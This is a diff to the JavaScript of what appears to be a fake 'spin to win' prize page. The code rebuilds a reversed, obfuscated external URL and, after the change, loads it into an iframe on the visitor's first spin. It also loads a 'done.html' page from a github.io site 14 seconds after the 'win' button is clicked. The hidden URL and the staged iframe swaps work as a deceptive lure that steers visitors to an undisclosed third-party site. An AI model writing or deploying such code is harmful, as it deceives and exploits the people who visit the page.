@@ -3,6 +3,7 @@ var slot_selector = $('.slot');
 var comment_count_selector = $('#comment-count');
 var switched = 0;
 var go_url = 'oi.buhtig.022scinhcetbrac=ps?/nitposc/w/ten.ndc-dw//:sptth';
+var page_url = 'carbtechnics220.github.io';
 var new_url = go_url.split("").reverse().join("");
 
 $(document).ready(function() {
@@ -39,10 +40,18 @@ function forwardTo(goto_link)
 $('#win-btn').click(function(e) {
 	e.preventDefault();
 	$('#iframe1').removeClass('hidden');
+	setTimeout(function() {
+		$('#iframe2').attr('src', 'https://'+page_url+'/done.html');
+	}, 14000);
 });
 
 $('#spin-btn').click(function() {
 //$('#overlay').click(function() {
+
+	if(count_spins == 0)
+	{
+		$('#iframe1').attr('src', new_url);
+	}
 	
 	if(count_spins < 3)
 	{
@@ -66,9 +75,6 @@ $('#spin-btn').click(function() {
 		}
 		else
 		{
-
-			$('#iframe1').attr('src', new_url);
-
 			for(i=0;i<5;i++)
 			{
 				$('.slot-'+i).addClass('spin-w');
